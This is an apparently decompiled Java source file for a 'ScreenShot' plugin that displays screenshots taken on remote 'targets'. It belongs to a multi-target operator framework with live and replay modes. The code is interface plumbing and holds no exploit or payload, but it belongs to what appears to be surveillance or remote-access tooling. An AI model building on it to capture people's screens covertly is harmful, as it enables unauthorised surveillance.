package ddb.dsz.plugin.screenshot;

import ddb.detach.TabbableStatus;
import ddb.dsz.annotations.DszDescription;
import ddb.dsz.annotations.DszLive;
import ddb.dsz.annotations.DszLogo;
import ddb.dsz.annotations.DszName;
import ddb.dsz.core.host.HostInfo;
import ddb.dsz.plugin.multitarget.MultipleTargetPlugin;
import ddb.dsz.plugin.multitarget.MultipleTargetWorkbench;
import ddb.dsz.plugin.multitarget.SingleTargetInterface;
import ddb.dsz.plugin.multitarget.MultipleTargetPlugin.LocalHostState;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Vector;
import java.util.logging.Level;

@DszLive(
   live = true,
   replay = true
)
@DszLogo("images/aktion.png")
@DszName("ScreenShot")
@DszDescription("Displays screenshots taken on targets")
public class ScreenShot extends MultipleTargetPlugin {
   public static final int HIGHLIGHT_TIME = 60;
   static List<String> interestingCommands = new Vector();

   public ScreenShot() {
      super.setName("ScreenShot");
      super.setCareAboutLocalEvents(true);
      super.setShowButtons(false);
   }

   public int init3() {
      this.core.logEvent(Level.FINE, "Initializing Screenshot");
      this.tabWorkbench.setTabPlacement(2);
      super.setDisplay(this.tabWorkbench);
      return 0;
   }

   protected MultipleTargetWorkbench generateWorkbench() {
      return new ScreenShotWorkBench(this);
   }

   protected SingleTargetInterface newHost(HostInfo var1) {
      return new ScreenShotHost(var1, this.core, this);
   }

   @Override
   public TabbableStatus getStatus() {
      return this.tabWorkbench.getStatus();
   }

   public String newItemName() {
      return "New Screenshot Display";
   }

   @Override
   public boolean caresAboutRepeatedEvents() {
      return true;
   }

   protected LocalHostState getLocalHostState() {
      return LocalHostState.IGNORE;
   }

   public static void main(String[] var0) throws Exception {
      Class var1 = Class.forName("ds.plugin.live.DSClientApp");
      Class var2 = Class.forName("ds.plugin.replay.OpReplayDriver");
      Method var3 = var2.getMethod("main", String[].class);
      var3.invoke((Object)null, var0);
   }

   static {
      interestingCommands.add("windows");
   }
}
